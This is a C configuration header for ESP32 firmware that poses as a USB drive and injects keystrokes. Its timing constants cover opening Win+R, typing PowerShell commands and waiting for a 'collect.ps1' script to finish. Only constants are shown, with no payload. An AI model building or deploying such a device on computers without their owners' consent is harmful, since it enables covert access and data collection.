#pragma once

// ─────────────────────────────────────────────────────────────────────────────
// config.h — project-wide configuration
//
// Add new timing, pin, or behavioural constants here rather than scattering
// magic numbers throughout the codebase.
// ─────────────────────────────────────────────────────────────────────────────

// ── Hardware pins ─────────────────────────────────────────────────────────────
#define PIN_TRIGGER   0    // BOOT button (active LOW)
#define PIN_LED       48   // Onboard RGB LED (used as single-colour status)

// ── USB MSC identity (shown in Windows Device Manager / Explorer) ─────────────
#define MSC_VENDOR_ID   "Espressif"   // max 8 chars
#define MSC_PRODUCT_ID  "ESP32"       // max 16 chars — this is the drive name
#define MSC_PRODUCT_REV "1.0"         // max 4 chars

// ── Timing (milliseconds) ─────────────────────────────────────────────────────
#define DEBOUNCE_MS          50     // button debounce
#define RUN_DIALOG_DELAY_MS  800    // wait after Win+R before typing
#define CMD_POWERSHELL_MS    3000   // wait after sending a powershell command
#define CMD_GENERIC_MS       1000   // wait after any other command
#define COMPLETION_WAIT_MS   30000  // time to allow collect.ps1 to finish

// ── Flash / MSC geometry ──────────────────────────────────────────────────────
#define FLASH_ERASE_SIZE    4096   // SPI NOR flash erase granularity (bytes)
#define MSC_SECTOR_SIZE     512    // FAT / USB MSC sector size (bytes)